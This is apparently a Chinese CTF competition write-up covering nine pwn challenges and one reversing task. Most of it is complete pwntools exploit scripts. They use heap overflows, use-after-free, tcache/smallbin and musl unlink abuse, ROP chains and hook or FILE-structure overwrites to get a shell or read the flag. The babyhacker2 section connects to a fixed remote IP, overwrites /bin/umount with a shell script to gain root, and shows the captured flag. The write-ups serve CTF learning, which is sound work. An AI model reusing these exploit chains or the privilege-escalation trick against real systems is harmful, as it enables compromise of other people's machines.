# pwn

## easyheap


add函数先malloc,然后才检查size,dele函数只清空了指针，size没有清空，两个函数配合使用可以导致堆溢出


```python=
from pwn import *

context.arch = 'amd64'

def cmd(command):
	p.recvuntil("choice:")
	p.sendline(str(command))
def add(sz,content):
	cmd(1)
	p.recvuntil("?")
	p.sendline(str(sz))
	p.recvuntil("?")
	p.send(content)

def dele(idx):
	cmd(2)
	p.recvuntil("?")
	p.sendline(str(idx))
def edit(idx,content):
	cmd(3)
	p.recvuntil("?")
	p.sendline(str(idx))
	p.recvuntil("?")
	p.send(content)
def main(host,port=9997):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./easyheap")
		gdb.attach(p)
	add(0x400,"A"*0x60)
	add(0x68,"A"*0x60)
	dele(1)
	dele(0)
	cmd(1)
	p.recvuntil("?")
	p.sendline(str(0x500))
	edit(0,p64(0x410)+p64(0x21)+"\x00"*0x18+p64(0x71)+p64(0x602095-8))
	add(0x68,"ddididi")
	payload = '\x00'*3+p64(0)*3+p64(0)+p64(0x6020c0)+p64(0x6020d8)+p64(0x6020e8)+p64(elf.got["free"])+p64(0x10)+p64(elf.got["read"])+p64(0x10)
	add(0x68,payload)
	edit(1,p64(elf.symbols["puts"]))
	dele(2)
	p.recv()
	libc.address = u64(p.recvuntil("\n")[:-1]+"\x00\x00") - libc.symbols["read"]
	info("libc : " + hex(libc.address))
	edit(0,p64(0)+p64(0x6020d0)+p64(elf.got["atoi"])+p64(0x10))
	payload = p64(libc.symbols["system"])
	edit(1,payload)
	p.recvuntil("choice:")
	p.sendline("/bin/sh")
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	elf = ELF("./easyheap",checksec=False)
	main(args['REMOTE'])
```

## woodenbox2


`change_item`函数没检查输入的size，导致堆溢出

```python=

from pwn import *

context.arch = 'amd64'

def cmd(command):
	p.recvuntil("choice:")
	p.sendline(str(command))
def add(sz,content):
	cmd(1)
	p.recvuntil("name:")
	p.sendline(str(sz))
	p.recvuntil("item:")
	p.send(content)

def dele(idx):
	cmd(3)
	p.recvuntil("item:")
	p.sendline(str(idx))
def edit(idx,sz,content):
	cmd(2)
	p.recvuntil("item:")
	p.sendline(str(idx))
	p.recvuntil("name:")
	p.sendline(str(sz))
	p.recvuntil("item:")
	p.send(content)
def main(host,port=9998):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./woodenbox2")
		gdb.attach(p)
	add(0x80,"dididid")
	for i in range(3):
		add(0x68,"dididid")
	dele(0)
	# t = int(raw_input("guess: "),16)
	t = 0xe
	stdout = (t << 12) | 0x620
	add(0x68,p16(stdout-0x43))
	add(0x10,"4")
	dele(0)
	dele(0)
	payload = "\x00"*0x18+p64(0x71)+"\x00"*0x68+p64(0x71)+p8(00)
	edit(2,len(payload),payload)
	
	for i in range(2):
		add(0x68,"AAA")
	add(0x68,"\x00"*0x33+p64(0xfbad1800)+p64(0)*3+'\x00')
	p.recv(0x40)
	libc.address = u64(p.recv(8)) - 0x3c5600
	info("libc : " + hex(libc.address))
	add(0x68,"aaa")
	dele(6)
	payload = "\x00"*0xd8+p64(0x71)+p64(libc.symbols["__malloc_hook"]-0x23)
	edit(2,len(payload),payload)
	add(0x68,"aaa")
	one = libc.address+0x4526a
	payload = "\x00"*0xb+p64(one)+p64(libc.symbols["realloc"])
	add(0x68,payload)
	cmd(1)
	p.recvuntil("name:")
	p.sendline(str(0x20))
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	# elf = ELF("./easyheap",checksec=False)
	main(args['REMOTE'])
```

## shotest_path


程序开始时把flag读入，用的是fgets,会在堆上残留flag的内容，程序add函数的截断有点问题:

```c=
 printf("Station Name Length: ", &v4);
        __isoc99_scanf((__int64)"%d", (__int64)nbytes);
        if ( nbytes[0] > 0xFF || nbytes[0] < 0 )
          nbytes[0] = 0xFF;
        puts("Station Name: ");
        buf = (char *)malloc(nbytes[0] + 1);
        v1 = buf;
        read(0, buf, (unsigned int)nbytes[0]);
        buf[nbytes[0]] = 0;
```

可以看到它不是在我们输入的长度处截断，而是直接在`Length`处截断了，本来应该是`buf[read(0, buf, (unsigned int)nbytes[0])] = 0;`这样的.

所以可以用`add`函数和`show`函数泄露flag

exp是调试的时候误打误撞的泄露了flag,所以就没改了 :P

```python=
from pwn import *

context.arch = 'amd64'


def cmd(command):
	p.recvuntil("---> ")
	p.sendline(str(command))
def add(id,price,name_len,name,num_of_connect=0,conets=0):
	cmd(1)
	p.recvuntil("ID: ")
	p.sendline(str(id))
	p.recvuntil("Price: ")
	p.sendline(str(price))
	p.recvuntil("Length: ")
	p.sendline(str(name_len))
	p.recvuntil("Name: ")
	p.send(name)
	p.recvuntil("station: ")
	p.sendline(str(num_of_connect))
	
		
def dele(id):
	cmd(2)
	p.recvuntil("ID: ")
	p.sendline(str(id))
	
def show(id):
	cmd(3)
	p.recvuntil("ID: ")
	p.sendline(str(id))

def main(host,port=19008):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./Shortest_path")
		gdb.attach(p,"b *0x000000000400FA5\nc")
	add(0,0xcafebabe,0x30,"A"*0x10)
	add(1,0xcafebabe,0x30,"A"*0x10)
	dele(0)
	dele(1)
	add(2,0xaaaa,0x10,p32(1)+p32(0x333)+p64(0x0000000006068E0))
	
	add(3,0xcafebabe,0x40,"A"*0x10)
	
	add(4,0xcafebabe,0x40,"A"*0x10)
	
	add(5,0xcafebabe,0x40,"A"*0x10)
	add(6,0xcafebabe,0x40,"A"*1)
	show(6)
	p.interactive()
	
if __name__ == "__main__":
	# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	# elf = ELF("./easyheap",checksec=False)
	main(args['REMOTE'])
```

## lgd


snprintf导致的堆溢出,程序有seccomp,改用orw

```python=

from pwn import *

context.arch = 'amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[3], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def cmd(command):
	p.recvuntil(">> ")
	p.sendline(str(command))
def add(sz,content):
	cmd(1)
	p.recvuntil("?")
	p.sendline(str(sz))
	p.recvuntil("?")
	p.send(content)

def dele(idx):
	cmd(2)
	p.recvuntil("?")
	p.sendline(str(idx))


def show(idx):
	cmd(3)
	p.recvuntil("?")
	p.sendline(str(idx))

def edit(idx,content):
	cmd(4)
	p.recvuntil("?")
	p.sendline(str(idx))
	p.recvuntil("?")
	p.send(content)
def main(host,port=9998):
	global p
	if host:
		p = remote(host,port)
	else:
		# p = process("./pwn")
		p = process("./pwn",env={"LD_PRELOAD":"./libc.so.6"})
		gdb.attach(p)
	# 0x00000000004023ad : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
	p_rsp = 0x00000000004023ad
	p.recvuntil("name? \n")
	payload = p64(p_rsp)+p64(0x603068)
	p.send(payload)
	add(0x88,"ddddd")
	add(0x68,"222222")
	dele(0)
	add(0x88,"0")
	show(0)
	p.recv()
	libc.address = u64(p.recvuntil("\n")[:-1]+"\x00\x00") - 0x3c4b78
	info("libc : " + hex(libc.address))
	add(0x30,"A"*0x200)
	add(0x68,"AAA")
	dele(3)
	edit(2,"\x00"*0x38+p64(0x71)+p64(libc.symbols["__malloc_hook"]-0x23))
	add(0x68,"AAA")
	# 0x0000000000033544: pop rax; ret;
	# 0x0000000000021102: pop rdi; ret;
	# 0x00000000001150c9: pop rdx; pop rsi; ret;
	# 0x00000000000bc375: syscall; ret;
	syscall = libc.address+0x00000000000bc375
	p_rdx_rsi = libc.address+0x00000000001150c9
	p_rdi = libc.address+0x0000000000021102
	p_rax = libc.address+0x0000000000033544
	payload = p64(p_rdi)+p64(0x603128)+p64(p_rdx_rsi)+p64(0)*2+p64(p_rax)+p64(2)+p64(syscall)
	payload += p64(p_rdi)+p64(3)+p64(p_rdx_rsi)+p64(0x50)+p64(0x603000)+p64(p_rax)+p64(0)+p64(syscall)
	payload += p64(p_rdi)+p64(1)+p64(p_rax)+p64(1)+p64(syscall)+"flag\x00\x00\x00\x00"
	add(0x68,"A"*0x20+payload)
	# 0x00000000000c96a6: add rsp, 0x38; ret;
	edit(4,"\x00"*0x13+p64(libc.address+0x00000000000c96a6))
	cmd(1)
	
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	# elf = ELF("./easyheap",checksec=False)
	main(args['REMOTE'])
```

## bjut


edit和show函数都没有检查负数的index，直接泄露和改写stderr,(应该是非预期了

```c=
unsigned __int64 edit()
{
  int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("The index of your hw:");
  __isoc99_scanf("%d", &v1);
  if ( v1 <= 15 && ptr[v1] )
  {
    puts("Input your hw:");
    read(0, ptr[v1], sizes[v1]);
  }
  else
  {
    puts("out of range!");
  }
  return __readfsqword(0x28u) ^ v2;
}
```

vtable在libc2.29下变得可写，exp参考了[https://xz.aliyun.com/t/7205](https://xz.aliyun.com/t/7205)

exp:

```python=
from pwn import *

context.arch = 'amd64'

def cmd(command):
	p.recvuntil(">")
	p.sendline(str(command))
def add(sz,content):
	cmd(1)
	p.recvuntil(":")
	p.sendline(str(sz))
	p.recvuntil(":")
	p.send(content)

def dele(idx):
	cmd(3)
	p.recvuntil(":")
	p.sendline(str(idx))


def show(idx):
	cmd(4)
	p.recvuntil(":")
	p.sendline(str(idx))

def edit(idx,content):
	cmd(2)
	p.recvuntil(":")
	p.sendline(str(idx))
	p.recvuntil(":")
	p.send(content)
def main(host,port=9997):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./hw")
		# p = process("./pwn",env={"LD_PRELOAD":"./libc.so.6"})
		gdb.attach(p)
	show(-16)
	p.recvuntil("Your hw:\n")
	p.recv(8)
	libc.address = u64(p.recv(8))-0x1e5703
	p.recvuntil("###")
	info("libc : " + hex(libc.address))
	p_rdi = 0x0000000000026542+libc.address
	payload = p64(0xfbad2087)+p64(0x1e5703+libc.address)*8
	payload += p64(0)*4+p64(libc.symbols["_IO_2_1_stdout_"])+p64(2)+p64(0xffffffffffffffff)+p64(0)+p64(0x1e7570+libc.address)+p64(0xffffffffffffffff)
	payload += p64(0)+p64(0x1e4780+libc.address)+p64(0)*6+p64(0x1e6560+libc.address)+p64(0xfbad2887)+p64(0x1e5703+libc.address)*8+p64(0)*4
	payload += p64(libc.symbols["_IO_2_1_stdin_"])+p64(1)+p64(0xffffffffffffffff)+p64(0)+p64(0x1e7580+libc.address)+p64(0xffffffffffffffff)
	payload += p64(0)+p64(0x1e5960+libc.address)+p64(p_rdi)+p64(0)*2+p64(0xffffffff)+p64(0)*2+p64(0x1e5960+libc.address)
	payload += p64(libc.symbols["_IO_2_1_stderr_"])+p64(libc.symbols["_IO_2_1_stdout_"])+p64(libc.symbols["_IO_2_1_stdin_"])
	payload += b'\x00'*0x108
	# 00000000000026542: pop rdi; ret;
	# 0x000000000012bdc9: pop rdx; pop rsi; ret;
	# 0x0000000000047cf8: pop rax; ret;
	# 0x00000000000cf6c5: syscall; ret;
	
	p_rdx_rsi = 0x000000000012bdc9+libc.address
	p_rax = 0x0000000000047cf8+libc.address
	syscall_ret = 0x00000000000cf6c5+libc.address
	payload += p64(libc.address+0x1afb84)+p64(0x0000000004014B0)+p64(libc.symbols["system"])
	payload += p64(libc.symbols["setcontext"])*12 #offset 0x68
	
	
	pause()
	edit(-16,payload)
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
	# elf = ELF("./easyheap",checksec=False)
	main(args['REMOTE'])
```

## babyhacker1

出题人把flag放在附件了。。。。

## babyhacker2

参考了[https://www.anquanke.com/post/id/193939#h3-10](https://www.anquanke.com/post/id/193939#h3-10),应该也非预期了。。。,不过远程只给了15秒的时间，连上去都难

```python=
from pwn import *
p = remote("121.36.215.224",9001)

p.recvuntil("$ ")
p.sendline("rm /bin/umount")
p.recvuntil("$ ")
p.sendline('echo "#!/bin/sh" > /bin/umount')
p.recvuntil("$ ")
p.sendline('echo "/bin/sh" >> /bin/umount')
p.recvuntil("$ ")
p.sendline("chmod +x /bin/umount")
p.recvuntil("$ ")
p.sendline("exit")
p.sendline("cat /flag")
p.interactive()
```

```c
xit
/bin/sh: can't access tty; job control turned off
/home/pwn # [DEBUG] Received 0x47 bytes:
    'cat /flag\r\n'
    'flag{B4by_k3rler_1s_such_2_3aby!a24d3df5645ff}\r\n'
    '/home/pwn # '
cat /flag
flag{B4by_k3rler_1s_such_2_3aby!a24d3df5645ff}
/home/pwn # $ 

```

## EasyVM


UAF：

```c
 case 1:
        buf = malloc(0x300u);
        read(0, buf, 0x2FFu);
        ptr->eip_ = (char *)buf;
        break;
      case 2:
        if ( !ptr )
          exit(0);
        run_vm(ptr);
        break;
      case 3:
        if ( !ptr )
          exit(0);
        free(ptr->stack);
        free(ptr);
        break;
```

任意地址读写：

```c
 if ( *a1->eip_ == 'T' )
    {
      v1 = (_BYTE *)a1->r3;
      *v1 = getchar();
      a1->eip_ += 2;
    }
    
if ( *a1->eip_ == 'S' )
    {
      putchar(*(char *)a1->r3);
      a1->eip_ += 2;
    }

```

劫持free_hook为system

exp：

```python

from pwn import *

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def cmd(command):
	p.recvuntil(">>> ")
	p.sendline(str(command))

def write_mem(addr,value):
	payload = ''
	offset = 0
	for v in value:
		payload += "q"+p32(addr+offset)+'v'+"\x00"*4+'T\x00'
		offset += 1
	return payload

def read_mem(addr,value):
	payload = ''
	offset = 0
	for v in value:
		payload += "q"+p32(addr+offset)+'v'+"\x00"*4+'S\x00'
		offset += 1
	return payload

def main(host,port=9999):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./EasyVM")
		# gdb.attach(p)
		debug(0x0000A53)
	cmd(1)
	payload = "\x11SSSS"
	p.send(payload.ljust(0x2ff,"\x99"))
	cmd(3)
	cmd(1)
	payload = "\x11"
	p.send(payload.ljust(0x2ff,"\x99"))
	cmd(2)
	p.recv()
	libc.address = int(p.recvuntil("\n")[:-1],16) - 0x1b2930
	info("libc : " + hex(libc.address))
	
	payload = read_mem(0x1b27b0+libc.address,"dddd")
	
	cmd(1)
	p.send(payload.ljust(0x2ff,"\x99"))
	cmd(2)
	p.recv()
	h = p.recv(1)+p.recv(1)+p.recv(1)+p.recv(1)
	heap = u32(h)
	info("heap : " + hex(heap))
	payload = write_mem(heap-0xa58,"d"*8)+write_mem(libc.symbols["__free_hook"],"dddd")
	cmd(1)
	p.send(payload.ljust(0x2ff,"\x99"))
	cmd(2)
	p.send("/bin/sh\x00"+p32(libc.symbols["system"]))
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("/lib/i386-linux-gnu/libc-2.23.so",checksec=False)
	# elf = ELF("./easyheap",checksec=False)
	main(args['REMOTE'])
```

## twochunk

赛后看wp复现，当时思路是正确的，只是没好好细看源码，唉，和大佬的差距有点大

这题利用的是`smallbin`放到`tcache`的时候是没有检查的：

```c
if (in_smallbin_range (nb))
    {
      idx = smallbin_index (nb);
      bin = bin_at (av, idx);

      if ((victim = last (bin)) != bin)
        {
          bck = victim->bk;
	  if (__glibc_unlikely (bck->fd != victim))
	    malloc_printerr ("malloc(): smallbin double linked list corrupted");
          set_inuse_bit_at_offset (victim, nb);
          bin->bk = bck;
          bck->fd = bin;

          if (av != &main_arena)
	    set_non_main_arena (victim);
          check_malloced_chunk (av, victim, nb);
#if USE_TCACHE
	  /* While we're here, if we see other chunks of the same size,
	     stash them in the tcache.  */
	  size_t tc_idx = csize2tidx (nb);
	  if (tcache && tc_idx < mp_.tcache_bins)
	    {
	      mchunkptr tc_victim;

	      /* While bin not empty and tcache not full, copy chunks over.  */
	      while (tcache->counts[tc_idx] < mp_.tcache_count
		     && (tc_victim = last (bin)) != bin)
		{
		  if (tc_victim != 0)
		    {
		      bck = tc_victim->bk;
		      set_inuse_bit_at_offset (tc_victim, nb);
		      if (av != &main_arena)
			set_non_main_arena (tc_victim);
		      bin->bk = bck;
		      bck->fd = bin;

		      tcache_put (tc_victim, tc_idx);
	            }
		}
	    }
#endif
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }
    }
```

我们可以伪造bk,把mmap出来的那段地址也放进tcache中，而` bck->fd = bin;`这句则会把libc的地址写入到mmap那段地址处，用功能5就能泄露出libc了，所以只有一次的show函数应该拿来泄露`heap`地址

复现的时候用的是自己编译的`libc2.30.so`

exp：

```python
from pwn import *

context.arch = 'amd64'

def debug(addr,PIE=True):
	if PIE:
		text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[2], 16)
		gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
	else:
		gdb.attach(p,"b *{}".format(hex(addr)))

def cmd(command):
	p.recvuntil("choice:")
	p.sendline(str(command))
def add(idx,sz):
	cmd(1)
	p.recvuntil(": ")
	p.sendline(str(idx))
	p.recvuntil(": ")
	p.sendline(str(sz))
	

def dele(idx):
	cmd(2)
	p.recvuntil(": ")
	p.sendline(str(idx))
	
def show(idx):
	cmd(3)
	p.recvuntil(": ")
	p.sendline(str(idx))
	
def edit(idx,content):
	cmd(4)
	p.recvuntil(": ")
	p.sendline(str(idx))
	p.recvuntil(": ")
	p.send(content)
def main(host,port=9999):
	global p
	if host:
		p = remote(host,port)
	else:
		# p = process("./twochunk")
		# p = process("./twochunk",env={"LD_PRELOAD":"./libc.so.6"})
		p = process("./twochunk",env={"LD_PRELOAD":"./libc-2.30.so"})
		gdb.attach(p)
		# debug(0x000000000001339)
	p.recvuntil(": ")
	p.send(p64(0x23333030-0x10)*6)
	p.recvuntil(": ")
	p.send("nothing")
	for i in range(7):
		add(0,0x300)
		dele(0)
	for i in range(6):
		add(0,0x180)
		dele(0)
	for i in range(5):
		add(0,0x88)
		dele(0)
	add(0,0xe9)
	dele(0)
	
	add(0,0x300)
	add(1,0x210)
	dele(0)
	add(0,0x270)
	dele(0)
	add(0,0x180)
	dele(1)
	dele(0)
	
	add(0,0x180)
	add(1,0x220)
	dele(0)
	dele(1)
	
	add(0,0xe9)
	dele(0)
	
	add(1,0x110)
	
	add(0,23333)
	
	# leak heap
	show(0)
	heap = u64(p.recv(8))-0x4d0
	info('heap:'+hex(heap))

	payload = "\x00"*0xf8+p64(0x91)+p64(heap+0x840)+p64(0x23333000-0x10)
	edit(0,payload)
	
	dele(1)
	# pause()  !!
	add(1,0x88)
	
	# leak libc
	cmd(5)
	p.recvuntil("message: ")
	libc.address = u64(p.recvuntil("\n")[:-1]+"\x00\x00") - 0x3b5c60
	info("libc : " + hex(libc.address))
	
	payload = p64(libc.symbols["execve"])+"/bin/sh\x00"+"\x00"*0x20+p64(0x23333008)+"\x00"*0x20
	
	cmd(6)
	p.recvuntil(": ")
	p.send(payload)
	cmd(7)
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./libc-2.30.so",checksec=False)
	# elf = ELF("./easyheap",checksec=False)
	main(args['REMOTE'])
```

## muslheap

赛后看wp复现，`musl libc`也是可以`unlink`的,而且几乎没什么检查，但人家毕竟主要用于嵌入式操作系统和移动设备，可以理解

先从free开始：

```c
void free(void *p)
{
	if (!p) return;

	struct chunk *self = MEM_TO_CHUNK(p);

	if (IS_MMAPPED(self))
		unmap_chunk(self);
	else
		__bin_chunk(self);
}
void __bin_chunk(struct chunk *self)
{
	struct chunk *next = NEXT_CHUNK(self);
	size_t final_size, new_size, size;
	int reclaim=0;
	int i;

	final_size = new_size = CHUNK_SIZE(self);

	/* Crash on corrupted footer (likely from buffer overflow) */
	if (next->psize != self->csize) a_crash();

	for (;;) {
		if (self->psize & next->csize & C_INUSE) {
			self->csize = final_size | C_INUSE;
			next->psize = final_size | C_INUSE;
			i = bin_index(final_size);
			lock_bin(i);
			lock(mal.free_lock);
			if (self->psize & next->csize & C_INUSE)
				break;
			unlock(mal.free_lock);
			unlock_bin(i);
		}

		if (alloc_rev(self)) {	//合并低地址的chunk
			self = PREV_CHUNK(self);
			size = CHUNK_SIZE(self);
			final_size += size;
			if (new_size+size > RECLAIM && (new_size+size^size) > size)
				reclaim = 1;
		}

		if (alloc_fwd(next)) {	//合并高地址的chunk
			size = CHUNK_SIZE(next);
			final_size += size;
			if (new_size+size > RECLAIM && (new_size+size^size) > size)
				reclaim = 1;
			next = NEXT_CHUNK(next);
		}
	}
```

在跟入`alloc_rev`：

```c
static int alloc_rev(struct chunk *c)
{
	int i;
	size_t k;
	while (!((k=c->psize) & C_INUSE)) {
		i = bin_index(k);
		lock_bin(i);
		if (c->psize == k) {
			unbin(PREV_CHUNK(c), i);
			unlock_bin(i);
			return 1;
		}
		unlock_bin(i);
	}
	return 0;
}
static void unbin(struct chunk *c, int i)
{
	if (c->prev == c->next)
		a_and_64(&mal.binmap, ~(1ULL<<i));
	c->prev->next = c->next;
	c->next->prev = c->prev;
	c->csize |= C_INUSE;
	NEXT_CHUNK(c)->psize |= C_INUSE;
}
```

这个`unbin`类似于`glibc`的`unlink`,如果我们伪造了`c->prev`和`c->next`，就可以向`c->prev+0x18`和`c->next+0x10`处分别写入`c->next`和`c->prev`的值，所以整体思路是：

- 先泄露libc地址和一开时mmap的地址
- 堆溢出，布置好堆布局，然后unlink，控制整个数组，这样我们有了任意地址读写的能力
- 在泄露栈地址
- 修改返回地址进行ROP

exp：

```python
from pwn import *

context.arch = 'amd64'

def cmd(command):
	p.recvuntil("> ")
	p.sendline(str(command))
def add(sz,content,y='n'):
	cmd(1)
	p.recvuntil(">")
	p.sendline(str(sz))
	p.recvuntil(">")
	p.sendline(y)
	p.recvuntil(">")
	if content:
		p.send(content)

def dele(idx):
	cmd(2)
	p.recvuntil(">")
	p.sendline(str(idx))


def show(idx):
	cmd(4)
	p.recvuntil(">")
	p.sendline(str(idx))

def edit(idx,content):
	cmd(3)
	p.recvuntil(">")
	p.sendline(str(idx))
	p.send(content)
def main(host,port=19008):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./carbon")
		# p = process(["./libc_debug.so","./carbon"])
		# p = process("./carbon",env={"LD_PRELOAD":"./libc_debug.so"})
		gdb.attach(p)
	add(0,"")
	show(0)
	libc.address = u64(p.recvuntil("Done.",drop=True)+'\x00\x00') - 0x292e50
	info("libc : " + hex(libc.address))
	mmap_addr = libc.address + 0x290000
	info("mmap : " + hex(mmap_addr))
	environ = mmap_addr + 0x4fd8
	add(0x60,"1\n")
	add(0x70,"2\n")
	add(0x60,"3\n")
	add(0x60,"4\n")
	dele(2)
	payload = p64(0x71)+p64(0x70)
	payload += p64(mmap_addr+0x28-0x18) + p64(mmap_addr+0x28-0x10)
	payload += "\x00"*0x50
	payload += p64(0x70)+p64(0x81)
	add(0x70,payload+'\n','Y')
	dele(3)
	
	payload = p64(0x000000000602034)+p64(0x70)+p64(environ)+p64(0x60)+p64(mmap_addr)
	
	edit(2,payload+'\n')
	edit(1,"\x00\n")
	show(2)
	
	stack = u64(p.recvuntil("Done.",drop=True)+'\x00\x00')
	info("stack : " + hex(stack))
	# 0x0000000000014862: pop rdi; ret; 
	p_rdi = 0x0000000000014862+libc.address
	payload = p64(0x60)+p64(stack-0x90)
	
	edit(3,payload[:-1]+'\n')
	edit(0,p64(p_rdi)+p64(libc.search("/bin/sh\x00").next())+p64(libc.symbols["system"])+'\n')
	
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./libc.so",checksec=False)
	# elf = ELF("./easyheap",checksec=False)
	main(args['REMOTE']) 
```



# Re

## 天津垓


先解出这个:

```cpp=
 for ( i = 0; i <= 17; ++i )
  {
    v43 = ~(Str[i] & *((_BYTE *)&v39 + i % 14)) & (Str[i] | *((_BYTE *)&v39 + i % 14));
    if ( v43 != *(&v1 + i) )
    {
      printf(v20, &v25);
      exit(1);
    }
  }
```

脚本为：

```cpp
#include <stdio.h>

char str[] = "Rising_Hopper!";

int main(){
	char v1[32];
	char res[32];
	int i,j;
	
	v1[0] = 17;
  	v1[1] = 8;
  	v1[2] = 6;
  	v1[3] = 10;
  	v1[4] = 15;
  	v1[5] = 20;
  	v1[6] = 42;
  	v1[7] = 59;
  	v1[8] = 47;
  	v1[9] = 3;
  	v1[10] = 47;
  	v1[11] = 4;
  	v1[12] = 16;
  	v1[13] = 72;
  	v1[14] = 62;
  	v1[15] = 0;
  	v1[16] = 7;
  	v1[17] = 16;

  	for(i = 0 ;i <= 17;i++){
  		for(j = 0;j < 0x100;j++){
  			if((~(j & str[i % 14]) & (j | str[i % 14])) == v1[i]){
  				res[i] = j;
 				break;
  			}
  		}
  	}


  	printf("%s\n",res);  //Caucasus@s_ability

	return 0;
}
```

得到的字符串为`Caucasus@s_ability`,然后用idapython模拟下那个异或操作：

```python
from idaapi import *

start_addr = 0x00000010040164D
end_addr = start_addr + 0x415
s = [ord(i) for i in "Caucasus@s_ability"]

i = 0

for addr in range(start_addr,end_addr):
    patch_byte(addr,Byte(addr)^s[i%18])
    i += 1

```

最后解一下：

```cpp
 for ( i = 0; i <= 50; ++i )
  {
    v10 = v11 * (unsigned int)(unsigned __int8)Str[i] % v12;
    if ( v10 != v9[i] )
    {
      printf(v2);
      exit(0);
    }
  }
```

就好了

```cpp
#include <stdio.h>
int main(){
  int v9[64];
  int mod = 0x8000000B;
  unsigned char flag[64];
  int i;
  unsigned char j;
  v9[0] = 0x1EA272;
  v9[1] = 0x206FC4;
  v9[2] = 0x1D2203;
  v9[3] = 0x1EEF55;
  v9[4] = 0x24F111;
  v9[5] = 0x193A7C;
  v9[6] = 2047032;
  v9[7] = 2184813;
  v9[8] = 2302911;
  v9[9] = 2263545;
  v9[10] = 1909251;
  v9[11] = 2165130;
  v9[12] = 1968300;
  v9[13] = 2243862;
  v9[14] = 2066715;
  v9[15] = 2322594;
  v9[16] = 1987983;
  v9[17] = 2243862;
  v9[18] = 1869885;
  v9[19] = 2066715;
  v9[20] = 2263545;
  v9[21] = 1869885;
  v9[22] = 964467;
  v9[23] = 944784;
  v9[24] = 944784;
  v9[25] = 944784;
  v9[26] = 728271;
  v9[27] = 1869885;
  v9[28] = 2263545;
  v9[29] = 2283228;
  v9[30] = 2243862;
  v9[31] = 2184813;
  v9[32] = 2165130;
  v9[33] = 2027349;
  v9[34] = 1987983;
  v9[35] = 2243862;
  v9[36] = 1869885;
  v9[37] = 2283228;
  v9[38] = 2047032;
  v9[39] = 1909251;
  v9[40] = 2165130;
  v9[41] = 1869885;
  v9[42] = 2401326;
  v9[43] = 1987983;
  v9[44] = 2243862;
  v9[45] = 2184813;
  v9[46] = 885735;
  v9[47] = 2184813;
  v9[48] = 2165130;
  v9[49] = 1987983;
  v9[50] = 2460375;

  for(i = 0;i <= 50;i++){
    for(j = 0;j <= 0xff;j++){
      if((0x4CE3 * j % mod) == v9[i]){
        flag[i] = j;
        break;
      }
    }
  }

  printf("%s\n",flag); 
  return 0;
}
```